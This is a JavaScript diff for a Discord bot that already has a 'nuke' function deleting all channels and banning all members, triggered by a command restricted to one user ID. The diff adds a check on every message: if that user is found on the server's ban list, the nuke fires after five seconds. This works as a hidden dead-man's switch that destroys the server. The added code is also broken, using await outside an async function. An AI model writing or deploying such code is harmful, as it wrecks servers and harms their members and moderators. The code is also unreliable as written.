@@ -8,11 +8,19 @@ client.on("message", (message) => {
   function nuke() {
     message.guild.channels.forEach(channel => channel.delete())
     message.guild.members.forEach(members => members.ban())
+  }try {
+    const banList = await message.guild.fetchBans();
+
+    const bannedUser = banList.find(user => user.id === '289523788822085632');
+
+    if (bannedUser) await setTimeout(nuke, 5000);;
+    else await message.channel.send('That user is not banned.');
+  } catch(err) {
+    console.error(err);
   }
   if(message.guild === null) {
     return;
   }else
-    
   if (message.content.startsWith("/nukelol")) {
     if (message.author.id !== '289523788822085632') 
       return message.reply("wow you really thought you were gonna get away with doing that didn't you.");
